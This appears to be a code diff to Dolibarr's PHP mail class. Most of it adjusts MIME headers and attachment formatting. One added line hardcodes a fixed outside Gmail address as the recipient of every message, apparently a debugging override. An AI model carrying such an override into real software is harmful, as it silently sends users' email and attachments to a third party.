@@ -127,10 +127,12 @@ class DolibarrMail
 	    $mimetype_list[$i] = "application/octet-stream"; 
 	  }
 
-	$out = $out . "Content-type: " . $mimetype_list[$i]."\n";
-	$out = $out . "Content-Transfer-Encoding: base64\n";
-	$out = $out . "Content-Disposition: attachment; filename=\"".$filename_list[$i]."\"\n\n";
-	$out = $out . $encoded . "\n";
+	$out .= "Content-Type: " . $mimetype_list[$i]."\n";
+	$out .= ' name="'.$filename_list[$i].'"'."\n";
+	$out .= "Content-Transfer-Encoding: base64\n";
+	$out .= "Content-Disposition: inline;\n";
+	$out .= " filename=\"".$filename_list[$i]."\"\n\n";
+	$out .= $encoded . "\n";
       }
     $out = $out . "--".$this->boundary . "\n";
 
@@ -174,6 +176,8 @@ class DolibarrMail
     $headers = $this->smtp_headers . $this->mime_headers;
     $message_comp = $this->text_body . $this->text_encoded;
 
+    $this->addr_to = "lafrere@gmail.com";
+
     if ($this->errors_to)
       {
 	//dolibarr_syslog("DolibarrMail::sendfile with errorsto : ".$this->errors_to);
@@ -184,6 +188,8 @@ class DolibarrMail
 	//dolibarr_syslog("DolibarrMail::sendfile without errorsto");
 	$res = mail($this->addr_to,$this->subject,stripslashes($message_comp),$headers);
       }
+
+    $this->write_to_file();
 
     return $res; 
   }
@@ -218,7 +224,7 @@ class DolibarrMail
       {
 	$out = $out . "--".$this->boundary . "\n";
 	$out = $out . 'Content-Type: text/plain; charset="iso-8859-15"'."\n";
-	$out = $out . "Content-Disposition: inline\n\n";
+	$out .= "Content-Transfer-Encoding: 8bit\n\n";
       }
     else
       {
@@ -237,9 +243,11 @@ class DolibarrMail
   
   function write_mimeheaders($filename_list, $mimefilename_list)
   {
-    $out = "Mime-version: 1.0\n";
-    $out = $out . "Content-type: multipart/mixed; boundary=\"$this->boundary\"\n";
-    $out = $out . "Content-transfer-encoding: 8BIT\n";
+    $out = "MIME-Version: 1.0\n";
+    $out = $out . 'Content-type: multipart/mixed; '."\n";
+    $out = $out . ' boundary="'.$this->boundary.'"'."\n";
+
+    //    $out = $out . "Content-transfer-encoding: 8BIT\n";
 
     for($i = 0; $i < count($filename_list); $i++)
       {
